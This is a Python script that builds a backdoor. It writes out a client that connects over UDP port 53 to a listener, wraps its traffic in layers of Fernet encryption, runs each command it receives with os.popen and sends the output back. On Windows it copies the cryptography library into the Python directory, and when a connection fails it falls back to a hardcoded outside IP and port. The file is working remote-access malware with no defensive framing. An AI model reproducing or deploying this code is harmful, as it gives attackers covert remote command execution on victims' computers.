import shutil
import os
import sys
if len(sys.argv) < 2:
  print("Usage: <program> <listener ip>")
  sys.exit(1)
ip = sys.argv[1]
keys = []
if not os.path.isfile("keys"):
     print("Keys file not found. Please generate one with \"key_generator.py\"")
     sys.exit(1)
for key in open("keys").readlines():
   keys.append(bytes(key.strip(), 'utf-8'))
keys.reverse()
keys2 = keys
keys2.reverse()

keys = str(keys)


full = f"""
import os
import sys
import time
import socket

lib = os.__file__
if "C:" in str(lib):
 if os.path.isdir("cryptography"):
    print("windows" + lib)
    loca = lib.find("os.py")
    print("copy cryptography " + lib[0:loca])
    os.system("copy cryptography " + lib[0:loca])
    os.system("rmdir /s /Q cryptography")
else:
    print("linux")

from cryptography.fernet import Fernet

keys = {keys}
keys2 = {keys2}
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
serv = ('{ip}', 53)

payload = bytes("HEARTBEAT", "utf-8")
s.connect(serv)
reset = False
while True:
 while not reset:
  while True:
   try:
    for key in keys:
       key2 = key.decode()
       key = Fernet(key)
       payload  = key.encrypt(payload)
    s.settimeout(30)
    s.sendto(payload, serv)
    data = s.recvfrom(999999)[0]
    for key in keys2:
       key2 = key.decode()
       key = Fernet(key)
       data = key.decrypt(data)
    print(data)
    if "SERVER RESET#--__--__2222" in data.decode():
           print("RESET")
           s.close()
           reset = True
    data = data.decode()
    payload = os.popen(data).read()
    payload = bytes(payload, "utf-8")
   except:
    print("Reconnecting")
    data = ""
    payload = b"RECONNECT"
    time.sleep(5)
    s.close()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    serv = ('193.161.193.99', 56271)
    s.connect(serv)
 print("SERVER END RESET")
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 serv = ('193.161.193.99', 56271)
 s.connect(serv)

"""
if not os.path.isdir("backdoor"):
 os.mkdir("backdoor")
os.system("cp -r cryptography backdoor")
open("backdoor/backdoor.py", "w").write(full)
print("BACKDOOR GENERATED SUCCESSFULLY")
